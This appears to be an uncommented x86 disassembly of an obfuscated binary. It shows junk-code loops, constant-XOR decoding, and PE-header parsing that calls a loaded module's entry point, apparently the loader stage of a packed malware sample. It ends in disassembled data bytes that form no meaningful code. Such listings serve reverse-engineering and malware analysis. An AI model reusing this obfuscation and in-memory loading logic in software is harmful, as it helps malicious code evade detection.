  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4235bf,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4235cb,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4235c7,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4235db,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4235db
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4235d3,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4235cf,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4235d7,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4235c7,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4235bf,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4235c7,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4235d3,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4235bf,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	jno    0x40a7b1
  40a7b6:	cdq    
  40a7b7:	xchg   BYTE PTR ds:0xc57e7e25,al
  40a7bd:	jg     0x40a83d
  40a7bf:	jle    0x40a7e7
  40a7c1:	dec    ecx
  40a7c2:	mov    bh,0x9f
  40a7c4:	add    BYTE PTR [edx],ah
  40a7c6:	adc    ebp,ebp
  40a7c8:	sub    al,0xa6
  40a7ca:	pop    es
  40a7cb:	pop    ebx
  40a7cc:	ins    DWORD PTR es:[edi],dx
  40a7cd:	ret    
  40a7ce:	mov    bh,0xc4
  40a7d0:	iret   
  40a7d1:	dec    edx
  40a7d2:	mov    BYTE PTR [esi-0x5dc6caf0],ah
  40a7d8:	leave  
  40a7d9:	fdivr  DWORD PTR [ecx-0x4b]
  40a7dc:	xchg   esp,eax
  40a7dd:	push   edx
  40a7de:	mov    eax,0x2b83eb29
  40a7e3:	push   0x6abbd281
  40a7e8:	dec    edx
  40a7e9:	cdq    
  40a7ea:	into   
  40a7eb:	adc    edx,DWORD PTR [edx+0xd]
  40a7ee:	sub    esi,DWORD PTR [esi-0x7093b914]
  40a7f4:	ins    BYTE PTR es:[edi],dx
  40a7f5:	sbb    BYTE PTR ds:0x7f8584fa,0x4c
  40a7fc:	fcomp  QWORD PTR [edi+edx*2-0xa7e58ad]
  40a803:	adc    DWORD PTR [ecx-0x571de2f2],ebx
  40a809:	mov    al,ds:0x3c1084a7
  40a80e:	cwde   
  40a80f:	sub    bl,ah
  40a811:	mov    cl,0x1
  40a813:	loopne 0x40a82b
  40a815:	sti    
  40a816:	push   eax
  40a817:	sub    al,0xef
  40a819:	jbe    0x40a7ce
  40a81b:	stos   BYTE PTR es:[edi],al
  40a81c:	lock add cl,al
  40a81f:	xor    DWORD PTR [ecx+0x1a],eax
  40a822:	xchg   esp,eax
  40a823:	cwde   
  40a824:	ror    edi,0x41
  40a827:	cmp    eax,0x58d0a43d
  40a82c:	repnz cli 
  40a82e:	ret    0xf96d
  40a831:	lods   al,BYTE PTR ds:[esi]
  40a832:	in     al,dx
  40a833:	sbb    al,0xdf
  40a835:	xchg   ecx,eax
  40a836:	xor    BYTE PTR [esi+0x8d48715],dl
  40a83c:	ja     0x40a838
